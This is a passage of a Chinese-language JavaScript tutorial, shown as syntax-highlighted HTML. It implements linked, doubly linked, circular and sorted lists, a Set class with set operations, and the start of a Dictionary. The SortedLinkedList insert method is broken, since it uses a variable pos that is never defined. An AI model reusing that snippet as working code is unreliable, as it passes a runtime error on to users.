    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;=</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>let</span> node <span>=</span> <span>this</span><span>.</span>head
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> index <span>&amp;&amp;</span> node <span>!=</span> <span>null</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
        node <span>=</span> node<span>.</span>next
      <span>}</span>
      <span>return</span> node
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
  <span>// 在任意位置插入元素</span>
  <span>insert</span><span>(</span><span>element<span>,</span> index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;=</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>const</span> node <span>=</span> <span>new</span> <span>Node</span><span>(</span>element<span>)</span>
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>// 在第一个位置添加</span>
        <span>const</span> current <span>=</span> <span>this</span><span>.</span>head
        node<span>.</span>next <span>=</span> current
        <span>this</span><span>.</span>head <span>=</span> node
      <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> previous <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index <span>-</span> <span>1</span><span>)</span>
        <span>const</span> current <span>=</span> previous<span>.</span>next
        node<span>.</span>next <span>=</span> current
        previous<span>.</span>next <span>=</span> node
      <span>}</span>
      <span>this</span><span>.</span>count<span>++</span> <span>// 更新链表的长度</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// indexOf 方法：返回一个元素的位置</span>
  <span>indexOf</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>count <span>&amp;&amp;</span> current <span>!=</span> <span>null</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span><span>equalsFn</span><span>(</span>element<span>,</span> current<span>.</span>element<span>)</span><span>)</span> <span>{</span>
        <span>return</span> i
      <span>}</span>
      current <span>=</span> current<span>.</span>next
    <span>}</span>
    <span>return</span> <span>-</span><span>1</span>
  <span>}</span>
  <span>// 从链表中移除元素</span>
  <span>remove</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>const</span> index <span>=</span> <span>this</span><span>.</span><span>indexOf</span><span>(</span>element<span>)</span>
    <span>return</span> <span>this</span><span>.</span><span>removeAt</span><span>(</span>index<span>)</span>
  <span>}</span>
  <span>// 检查链表是否为空</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 获取链表长度</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>count
  <span>}</span>
  <span>// 获取链表头部</span>
  <span>getHead</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>head
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>head <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> <span>''</span>
    <span>}</span>
    <span>let</span> objString <span>=</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span>head<span>.</span>element<span>}</span></span><span>`</span></span>
    <span>let</span> current <span>=</span> <span>this</span><span>.</span>head<span>.</span>next
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>&amp;&amp;</span> current <span>!=</span> <span>null</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
      objString <span>=</span> <span><span>`</span><span><span>${</span>objString<span>}</span></span><span>,</span><span><span>${</span>current<span>.</span>element<span>}</span></span><span>`</span></span>
      current <span>=</span> current<span>.</span>next
    <span>}</span>
    <span>return</span> objString
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br></div></div><h2 id="_7-双向链表"> 7. 双向链表</h2>
<ul>
<li>双向链表和普通链表的区别在于，在链表中，一个节点只有链向下一个节点的链接。而在双向链表中，链接是双向的：一个链向下一个元素，另一个链向前一个元素。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/双向链表.png')" loading="lazy">
<div><pre><code><span>class</span> <span>DoublyNode</span> <span>extends</span> <span>Node</span> <span>{</span>
  <span>constructor</span><span>(</span><span>element<span>,</span> next<span>,</span> prev</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>element<span>,</span> next<span>)</span>
    <span>this</span><span>.</span>prev <span>=</span> prev <span>// 新增的</span>
  <span>}</span>
<span>}</span>
<span>class</span> <span>DoublyLinkedList</span> <span>extends</span> <span>LinkedList</span> <span>{</span>
  <span>constructor</span><span>(</span><span>equalsFn <span>=</span> defaultEquals</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>equalsFn<span>)</span>
    <span>this</span><span>.</span>tail <span>=</span> <span>undefined</span> <span>// 新增的</span>
  <span>}</span>
  <span>// 在任意位置插入新元素</span>
  <span>insert</span><span>(</span><span>element<span>,</span> index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;=</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>const</span> node <span>=</span> <span>new</span> <span>DoublyNode</span><span>(</span>element<span>)</span>
      <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>// 新增的</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span>head <span>==</span> <span>null</span><span>)</span> <span>{</span>
          <span>this</span><span>.</span>head <span>=</span> node
          <span>this</span><span>.</span>tail <span>=</span> node
        <span>}</span> <span>else</span> <span>{</span>
          node<span>.</span>next <span>=</span> <span>this</span><span>.</span>head
          current<span>.</span>prev <span>=</span> node <span>// 新增的</span>
          <span>this</span><span>.</span>head <span>=</span> node
        <span>}</span>
        <span>// 最后一项 // 新增的</span>
      <span>}</span> <span>else</span> <span>if</span> <span>(</span>index <span>===</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
        current <span>=</span> <span>this</span><span>.</span>tail
        current<span>.</span>next <span>=</span> node
        node<span>.</span>prev <span>=</span> current
        <span>this</span><span>.</span>tail <span>=</span> node
      <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> previous <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index <span>-</span> <span>1</span><span>)</span> <span>// {9}</span>
        current <span>=</span> previous<span>.</span>next
        node<span>.</span>next <span>=</span> current
        previous<span>.</span>next <span>=</span> node
        current<span>.</span>prev <span>=</span> node <span>// 新增的</span>
        node<span>.</span>prev <span>=</span> previous <span>// 新增的</span>
      <span>}</span>
      <span>this</span><span>.</span>count<span>++</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从任意位置移除元素</span>
  <span>removeAt</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>head <span>=</span> current<span>.</span>next
        <span>// 如果只有一项，更新 tail // 新增的</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span>count <span>===</span> <span>1</span><span>)</span> <span>{</span>
          <span>this</span><span>.</span>tail <span>=</span> <span>undefined</span>
        <span>}</span> <span>else</span> <span>{</span>
          <span>this</span><span>.</span>head<span>.</span>prev <span>=</span> <span>undefined</span>
        <span>}</span>
        <span>// 最后一项 //新增的</span>
      <span>}</span> <span>else</span> <span>if</span> <span>(</span>index <span>===</span> <span>this</span><span>.</span>count <span>-</span> <span>1</span><span>)</span> <span>{</span>
        current <span>=</span> <span>this</span><span>.</span>tail
        <span>this</span><span>.</span>tail <span>=</span> current<span>.</span>prev
        <span>this</span><span>.</span>tail<span>.</span>next <span>=</span> <span>undefined</span>
      <span>}</span> <span>else</span> <span>{</span>
        current <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index<span>)</span>
        <span>const</span> previous <span>=</span> current<span>.</span>prev
        <span>// 将 previous 与 current 的下一项链接起来——跳过 current</span>
        previous<span>.</span>next <span>=</span> current<span>.</span>next
        current<span>.</span>next<span>.</span>prev <span>=</span> previous <span>// 新增的</span>
      <span>}</span>
      <span>this</span><span>.</span>count<span>--</span>
      <span>return</span> current<span>.</span>element
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br></div></div><h2 id="_8-循环链表"> 8. 循环链表</h2>
<ul>
<li>循环链表可以像链表一样只有单向引用，也可以像双向链表一样有双向引用。循环链表和链表之间唯一的区别在于，最后一个元素指向下一个元素的指针（ tail.next ）不是引用 undefined，而是指向第一个元素（ head ）。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/循环链表.png')" loading="lazy">
<div><pre><code><span>class</span> <span>CircularLinkedList</span> <span>extends</span> <span>LinkedList</span> <span>{</span>
  <span>constructor</span><span>(</span><span>equalsFn <span>=</span> defaultEquals</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>equalsFn<span>)</span>
  <span>}</span>
  <span>// 在任意位置插入新元素</span>
  <span>insert</span><span>(</span><span>element<span>,</span> index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;=</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>const</span> node <span>=</span> <span>new</span> <span>Node</span><span>(</span>element<span>)</span>
      <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span>head <span>==</span> <span>null</span><span>)</span> <span>{</span>
          <span>this</span><span>.</span>head <span>=</span> node
          node<span>.</span>next <span>=</span> <span>this</span><span>.</span>head <span>// 新增的</span>
        <span>}</span> <span>else</span> <span>{</span>
          node<span>.</span>next <span>=</span> current
          current <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span><span>this</span><span>.</span><span>size</span><span>(</span><span>)</span><span>)</span>
          <span>// 更新最后一个元素</span>
          <span>this</span><span>.</span>head <span>=</span> node
          current<span>.</span>next <span>=</span> <span>this</span><span>.</span>head <span>// 新增的</span>
        <span>}</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>// 这种场景没有变化</span>
        <span>const</span> previous <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index <span>-</span> <span>1</span><span>)</span>
        node<span>.</span>next <span>=</span> previous<span>.</span>next
        previous<span>.</span>next <span>=</span> node
      <span>}</span>
      <span>this</span><span>.</span>count<span>++</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从任意位置移除元素</span>
  <span>removeAt</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>1</span><span>)</span> <span>{</span>
          <span>this</span><span>.</span>head <span>=</span> <span>undefined</span>
        <span>}</span> <span>else</span> <span>{</span>
          <span>const</span> removed <span>=</span> <span>this</span><span>.</span>head
          current <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span><span>this</span><span>.</span><span>size</span><span>(</span><span>)</span><span>)</span> <span>// 新增的</span>
          <span>this</span><span>.</span>head <span>=</span> <span>this</span><span>.</span>head<span>.</span>next
          current<span>.</span>next <span>=</span> <span>this</span><span>.</span>head
          current <span>=</span> removed
        <span>}</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>// 不需要修改循环链表最后一个元素</span>
        <span>const</span> previous <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index <span>-</span> <span>1</span><span>)</span>
        current <span>=</span> previous<span>.</span>next
        previous<span>.</span>next <span>=</span> current<span>.</span>next
      <span>}</span>
      <span>this</span><span>.</span>count<span>--</span>
      <span>return</span> current<span>.</span>element
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br></div></div><h2 id="_9-有序链表"> 9. 有序链表</h2>
<ul>
<li>有序链表是指保持元素有序的链表结构。除了使用排序算法之外，我们还可以将元素插入到正确的位置来保证链表的有序性。</li>
</ul>
<div><pre><code><span>const</span> Compare <span>=</span> <span>{</span>
  <span>LESS_THAN</span><span>:</span> <span>-</span><span>1</span><span>,</span>
  <span>BIGGER_THAN</span><span>:</span> <span>1</span><span>,</span>
<span>}</span>

<span>function</span> <span>defaultCompare</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>a <span>===</span> b<span>)</span> <span>{</span>
    <span>return</span> <span>0</span>
  <span>}</span>
  <span>return</span> a <span>&lt;</span> b <span>?</span> Compare<span>.</span><span>LESS_THAN</span> <span>:</span> Compare<span>.</span><span>BIGGER_THAN</span>
<span>}</span>

<span>class</span> <span>SortedLinkedList</span> <span>extends</span> <span>LinkedList</span> <span>{</span>
  <span>constructor</span><span>(</span><span>equalsFn <span>=</span> defaultEquals<span>,</span> compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>equalsFn<span>)</span>
    <span>this</span><span>.</span>compareFn <span>=</span> compareFn
  <span>}</span>
  <span>// 有序插入元素</span>
  <span>insert</span><span>(</span><span>element<span>,</span> index <span>=</span> <span>0</span></span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>super</span><span>.</span><span>insert</span><span>(</span>element<span>,</span> <span>0</span><span>)</span>
    <span>}</span>
    <span>return</span> <span>super</span><span>.</span><span>insert</span><span>(</span>element<span>,</span> pos<span>)</span>
  <span>}</span>
  <span>getIndexNextSortedElement</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
    <span>let</span> i <span>=</span> <span>0</span>
    <span>for</span> <span>(</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>&amp;&amp;</span> current<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> comp <span>=</span> <span>this</span><span>.</span><span>compareFn</span><span>(</span>element<span>,</span> current<span>.</span>element<span>)</span>
      <span>if</span> <span>(</span>comp <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
        <span>return</span> i
      <span>}</span>
      current <span>=</span> current<span>.</span>next
    <span>}</span>
    <span>return</span> i
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div><h2 id="_10-集合"> 10. 集合</h2>
<ul>
<li>集合是由一组无序且唯一（即不能重复）的项组成的。该数据结构使用了与有限集合相同的数学概念，但应用在计算机科学的数据结构中。</li>
</ul>
<div><pre><code><span>class</span> <span>Set</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 检查是否存在此元素</span>
  <span>has</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>return</span> <span>Object</span><span>.</span>prototype<span>.</span><span>hasOwnProperty</span><span>.</span><span>call</span><span>(</span><span>this</span><span>.</span>items<span>,</span> element<span>)</span>
  <span>}</span>
  <span>// 向集合添加一个新元素</span>
  <span>add</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span><span>has</span><span>(</span>element<span>)</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>items<span>[</span>element<span>]</span> <span>=</span> element
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从集合移除一个元素</span>
  <span>delete</span><span>(</span>element<span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>has</span><span>(</span>element<span>)</span><span>)</span> <span>{</span>
      <span>delete</span> <span>this</span><span>.</span>items<span>[</span>element<span>]</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 移除集合中的所有元素</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 返回集合所包含元素的数量</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> Object<span>.</span><span>keys</span><span>(</span><span>this</span><span>.</span>items<span>)</span><span>.</span>length
  <span>}</span>
  <span>// 返回一个包含集合中所有值（元素）的数组</span>
  <span>values</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> Object<span>.</span><span>values</span><span>(</span><span>this</span><span>.</span>items<span>)</span>
  <span>}</span>

  <span>// 并集</span>
  <span>union</span><span>(</span><span>otherSet</span><span>)</span> <span>{</span>
    <span>const</span> unionSet <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span>
    <span>this</span><span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>value</span> <span>=></span> unionSet<span>.</span><span>add</span><span>(</span>value<span>)</span><span>)</span>
    otherSet<span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>value</span> <span>=></span> unionSet<span>.</span><span>add</span><span>(</span>value<span>)</span><span>)</span>
    <span>return</span> unionSet
  <span>}</span>
  <span>// 交集</span>
  <span>intersection</span><span>(</span><span>otherSet</span><span>)</span> <span>{</span>
    <span>const</span> intersectionSet <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span>
    <span>const</span> values <span>=</span> <span>this</span><span>.</span><span>values</span><span>(</span><span>)</span>
    <span>const</span> otherValues <span>=</span> otherSet<span>.</span><span>values</span><span>(</span><span>)</span>
    <span>let</span> biggerSet <span>=</span> values
    <span>let</span> smallerSet <span>=</span> otherValues
    <span>if</span> <span>(</span>otherValues<span>.</span>length <span>-</span> values<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
      biggerSet <span>=</span> otherValues
      smallerSet <span>=</span> values
    <span>}</span>
    smallerSet<span>.</span><span>forEach</span><span>(</span><span>value</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>biggerSet<span>.</span><span>includes</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
        intersectionSet<span>.</span><span>add</span><span>(</span>value<span>)</span>
      <span>}</span>
    <span>}</span><span>)</span>
    <span>return</span> intersectionSet
  <span>}</span>
  <span>// 差集</span>
  <span>difference</span><span>(</span><span>otherSet</span><span>)</span> <span>{</span>
    <span>const</span> differenceSet <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span>
    <span>this</span><span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>value</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>otherSet<span>.</span><span>has</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
        differenceSet<span>.</span><span>add</span><span>(</span>value<span>)</span>
      <span>}</span>
    <span>}</span><span>)</span>
    <span>return</span> differenceSet
  <span>}</span>
  <span>// 子集</span>
  <span>isSubsetOf</span><span>(</span><span>otherSet</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>></span> otherSet<span>.</span><span>size</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>false</span>
    <span>}</span>
    <span>let</span> isSubset <span>=</span> <span>true</span>
    <span>this</span><span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>every</span><span>(</span><span>value</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>otherSet<span>.</span><span>has</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
        isSubset <span>=</span> <span>false</span>
        <span>return</span> <span>false</span>
      <span>}</span>
      <span>return</span> <span>true</span>
    <span>}</span><span>)</span>
    <span>return</span> isSubset
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br></div></div><h2 id="_11-集合运算-使用扩展运算符"> 11. 集合运算 - 使用扩展运算符</h2>
<ul>
<li>
<p>并集：<code>new Set([...setA, ...setB]</code></p>
</li>
<li>
<p>交集：<code>new Set([...setA].filter(x =&gt; setB.has(x)))</code></p>
</li>
<li>
<p>差集：<code>new Set([...setA].filter(x =&gt; !setB.has(x)))</code></p>
</li>
</ul>
<h2 id="_12-字典"> 12. 字典</h2>
<ul>
<li>在字典中，存储的是[键，值]对，其中键名是用来查询特定元素的。字典和集合很相似，集合以[值，值]的形式存储元素，字典则是以[键，值]的形式来存储元素。字典也称作映射、符号表或关联数组。</li>
</ul>
<div><pre><code><span>function</span> <span>defaultToString</span><span>(</span><span>item</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>item <span>===</span> <span>null</span><span>)</span> <span>{</span>
    <span>return</span> <span>'NULL'</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>item <span>===</span> <span>undefined</span><span>)</span> <span>{</span>
    <span>return</span> <span>'UNDEFINED'</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>typeof</span> item <span>===</span> <span>'string'</span> <span>||</span> item <span>instanceof</span> <span>String</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span><span>${</span>item<span>}</span></span><span>`</span></span>
  <span>}</span>
  <span>return</span> item<span>.</span><span>toString</span><span>(</span><span>)</span>
<span>}</span>

<span>class</span> <span>ValuePair</span> <span>{</span>
  <span>constructor</span><span>(</span><span>key<span>,</span> value</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>key <span>=</span> key
    <span>this</span><span>.</span>value <span>=</span> value
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span>[#</span><span><span>${</span><span>this</span><span>.</span>key<span>}</span></span><span>: </span><span><span>${</span><span>this</span><span>.</span>value<span>}</span></span><span>]</span><span>`</span></span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>Dictionary</span> <span>{</span>
  <span>constructor</span><span>(</span><span>toStrFn <span>=</span> defaultToString</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>toStrFn <span>=</span> toStrFn
    <span>this</span><span>.</span>table <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 检测一个键是否存在于字典中</span>
  <span>hasKey</span><span>(</span><span>key</span><span>)</span> <span>{</span>
